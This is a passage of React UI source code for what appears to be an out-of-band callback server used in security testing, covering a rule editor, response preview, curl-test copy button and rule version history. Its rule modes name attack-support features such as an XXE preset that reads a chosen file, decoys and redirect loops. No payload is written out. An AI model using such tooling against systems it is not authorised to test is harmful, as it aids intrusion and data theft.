              const meta = `${scheme.toUpperCase()}${loop ? ` · hop ${hop}/${hops}` : ""}${draft.mode !== "default" && decoyOf(draft.decoy) ? " · past the decoy" : ""}${preview.delayMs ? ` · after ${preview.delayMs} ms` : ""}`;
              const why = [draft.mode !== "default" && decoyOf(draft.decoy) && "what a request past the decoy gets", dirty && "includes your unsaved changes"].filter(Boolean).join("; ");
              return <span className="truncate text-label font-normal text-ash" title={why ? `${meta}: ${why}` : meta}>{meta}</span>;
            })()}
            <span className="ml-auto flex items-center gap-0.5">
              <Button variant="ghost" size="icon-sm" aria-label="Copy a curl test" title={`A curl that asks the saved rule for this answer (${scheme.toUpperCase()}${loop ? ", following the loop" : ""})`}
                onClick={() => copy(`curl -i${loop ? "L" : ""} ${draft.mode === "file" ? fetchUrls[scheme === "http" ? 0 : 1] : `${scheme}://${tagged(p.tag, host)}/`}`, "curl test")}><Terminal /></Button>
              <Seg label="Preview scheme" value={scheme} onChange={setScheme} items={[["http", "HTTP"], ["https", "HTTPS"]]} />
              {loop > 0 && <>
                <Button variant="ghost" size="icon-sm" aria-label="Previous hop" disabled={hop <= 1} onClick={() => setHop(hop - 1)}><ChevronLeft /></Button>
                <Button variant="ghost" size="icon-sm" aria-label="Next hop" disabled={hop >= hops} onClick={() => setHop(hop + 1)}><ChevronRight /></Button>
              </>}
            </span>
          </div>
          {pending
            ? <p className="px-3 py-2.5 text-body text-ash">{preview.error!.replace(/ is required\.?$/, "")} needed to preview the answer.</p>
            : preview.error
            ? <p className="px-3 py-2.5 text-body text-bad">Can't answer like this yet: {preview.error}</p>
            : <pre className="m-0 max-h-[260px] overflow-auto px-3 py-2 font-mono text-body leading-[1.125rem] break-all whitespace-pre-wrap text-bone">{previewLines(preview.raw, p.tag)}</pre>}
        </div>

        <div className="rounded-[3px] border border-rule bg-soot">
          <div className="flex h-7 items-center gap-2 border-b border-rule-2 px-3 text-body font-[650]">Rule history<span className="truncate text-label font-normal text-ash">each hit records the version that answered it</span></div>
          <ol className="m-0 list-none">
            {(rs?.history ?? []).map((v, n, all) => <HistoryRow key={v.version} v={v} prev={all[n + 1]} live={live} current={v.version === rs?.active?.version} onLoad={() => { setDraft(norm(v.rule)); setHop(1); }} />)}
            {(live || !!rs?.defaultHits) && (
              <li className={HIST_ROW}>
                <span className="flex items-baseline gap-2"><span className={HIST_V}>—</span><span className="min-w-0 flex-1 truncate text-body text-smoke">Default reply from Colluder (no rule)</span><span className={HIST_WHEN}>{dayOrTime(p.plantedAt)}</span></span>
                <span className={HIST_META}>answered {plural(rs?.defaultHits ?? 0, "hit")}</span>
              </li>
            )}
            {!!rs?.interactshHits && (
              <li className={HIST_ROW}>
                <span className="flex items-baseline gap-2"><span className={HIST_V} /><span className="min-w-0 flex-1 truncate text-body text-smoke">Answered by interactsh (before the edge)</span></span>
                <span className={HIST_META}>{plural(rs.interactshHits, "hit")}</span>
              </li>
            )}
          </ol>
        </div>
      </aside>

      <div ref={foot} className={cn("sticky bottom-0 z-10 col-span-full -mx-6 flex flex-wrap items-center gap-2 border-t border-rule bg-soot-1 px-6 py-3 max-[820px]:bottom-7 max-[820px]:-mx-3.5 max-[820px]:px-3.5", !dirty && "max-[820px]:static")}>
        {dirty && <span className="mr-1 flex items-center gap-1.5 text-body text-smoke"><i className="inline-block size-1.5 rounded-full border-[1.5px] border-smoke" />Unsaved changes</span>}
        <Button disabled={!dirty || saving || !!preview.error} onClick={save} title={`Save (${/Mac|iP(hone|ad)/.test(navigator.platform) ? "⌘S" : "Ctrl+S"})`}>Save as v{nextVersion}</Button>
        <Button variant="quiet" disabled={!dirty || saving} onClick={() => { setDraft(base); setHop(1); }}>Discard</Button>
        <span className="ml-2 text-label text-ash">{live ? "Saved rules answer the next hit." : "Saved rules go live with the cutover."} Earlier hits keep the answer they got.</span>
      </div>
    </div>
    </div>
  );
}

function CopyLine({ text, what, strong }: { text: string; what: string; strong?: boolean }) {
  return (
    <div className="flex min-w-0 items-center gap-1">
      <code className={cn("font-mono text-body", strong ? "break-all text-bone" : "truncate text-smoke")} title={text}>{text}</code>
      <Button variant="ghost" size="icon-sm" aria-label={`Copy ${what}`} onClick={() => copy(text, what)}><Copy /></Button>
    </div>
  );
}

function HistoryRow({ v, prev, current, live, onLoad }: { v: RuleVersion; prev?: RuleVersion; current: boolean; live: boolean; onLoad: () => void }) {
  // what this version changed from the one before it (history is newest first)
  const changed = prev ? ruleChanges(prev.rule, v.rule) : [];
  const r = v.rule;
  const codes = Array.isArray(r.hopStatuses) && r.hopStatuses.length ? ` (${r.hopStatuses.join("/")})` : "";
  const what = (r.mode === "default" ? "Default reply" : r.mode === "redirect" ? `Redirect ${r.status} → ${r.location}${r.loop ? `, loop ×${r.loop}${codes}` : ""}`
    : r.mode === "file" ? `Hosted file, ${r.contentType}` : r.mode === "preset" ? `XXE preset, reads ${r.params?.file}` : `Custom ${r.status}`) + (r.decoy ? ", with a decoy" : "");
  const depth = r.mode === "redirect" && r.loop && v.maxHop ? `deepest hop ${v.maxHop}/${r.loop + 1}${(v.clients?.length ?? 0) > 1 ? ` (${v.clients!.length} clients)` : ""}` : "";
  const decoys = v.decoys ? `${v.decoys} decoy` : "";
  const state = current ? (live ? "active" : "saved · not served yet") : null;
  const meta = [v.savedBy === "claude" && "by Claude", `answered ${plural(v.hits ?? 0, "hit")}`, decoys, depth].filter(Boolean) as string[];
  return (
    <li className={cn(HIST_ROW, current && "bg-soot-2")}>
      <button type="button" className="group flex min-w-0 cursor-pointer items-baseline gap-2 text-left" title={`Load v${v.version} into the editor${prev ? `\nChanged from v${prev.version}: ${changed.length ? changed.join(", ") : "nothing"}` : ""}`} onClick={onLoad}>
        <span className={HIST_V}>v{v.version}</span>
        <span className={cn("min-w-0 flex-1 truncate text-body group-hover:text-bone", current ? "text-bone" : "text-smoke")}>{what}</span>
        <span className={HIST_WHEN} title={exact(v.createdAt)}>{dayOrTime(v.createdAt)}</span>
      </button>
      <span className={HIST_META}>
        {state && <span className={live ? "font-[650] text-smoke" : undefined}>{state}</span>}
        {meta.map((m) => <span key={m}>{m}</span>)}
        {prev && changed.length > 0 && <span className="min-w-0 truncate">changed {changed.join(", ")}</span>}
      </span>
    </li>
  );
}

// a history row: the version, what it answers and when on one line; its state and counts under it
const HIST_ROW = "flex flex-col gap-0.5 border-b border-rule-2 px-3 py-1.5 last:border-b-0";
const HIST_V = "w-[26px] flex-none font-mono text-label font-semibold text-smoke";
const HIST_WHEN = "flex-none text-label whitespace-nowrap text-ash";
const HIST_META = "flex min-w-0 flex-wrap gap-x-1.5 pl-[34px] text-label text-ash [&>*+*]:before:mr-1.5 [&>*+*]:before:content-['·']";

// the answer as the edge would send it, tinted like a hit's raw response: status, then header names
// until the first blank line
function previewLines(raw: string | undefined, tag: string) {
  if (!raw) return " ";
  let inHead = true;
  // the last line break ends the last line; it isn't a line of its own
  return raw.replace(/\r?\n$/, "").split(/\r?\n/).map((ln, idx) => {
    const head = inHead;
    if (inHead && ln === "" && idx > 0) inHead = false;
    return <span key={idx} className="block min-h-[18px]"><ExactLine ln={ln} idx={idx} inHead={head} tag={tag} /></span>;
  });
}
